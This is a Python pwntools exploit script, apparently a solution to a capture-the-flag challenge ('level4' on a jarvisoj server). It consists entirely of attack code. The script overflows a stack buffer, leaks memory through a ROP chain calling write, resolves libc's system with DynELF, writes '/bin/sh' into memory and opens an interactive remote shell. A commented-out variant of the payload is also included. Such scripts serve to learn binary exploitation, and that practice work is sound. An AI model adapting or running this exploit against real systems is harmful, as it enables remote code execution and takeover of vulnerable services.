#! /usr/bin/python

from pwn import *
from LibcSearcher import *

p = remote('pwn2.jarvisoj.com',9880)
#p = process('./level4')
elf = ELF('./level4')
#context.log_level = 'debug'


write_plt = elf.symbols['write']
write_got = elf.got['write']
offset = 0x88
start = 0x08048350
pppr = 0x08048509


def leak(address):
	payload = 'A' * offset + 'dead' + p32(write_plt) + p32(start) + p32(1) + p32(address) + p32(0x4)
	p.sendline(payload)
	data = p.recv(4)
	return data


d = DynELF(leak,elf=ELF('./level4'))
system = d.lookup('system', 'libc')
read = elf.symbols['read']
bss = elf.symbols['__bss_start']


payload = 'A' * offset + 'dead' + p32(read) + p32(pppr) + p32(0) + p32(bss) + p32(8)
payload+= p32(system) + p32(32) + p32(bss)
p.sendline(payload)
p.send("/bin/sh\0")

'''
payload = 'A' * offset + 'dead' + p32(read) + p32(start) + p32(0) + p32(bss) + p32(8)
p.send(payload)
p.send('/bin/sh\x00')

payload = 'A' * offset + 'dead' + p32(system) + 'dead' + p32(bss)
p.sendline(payload)
'''

p.interactive()
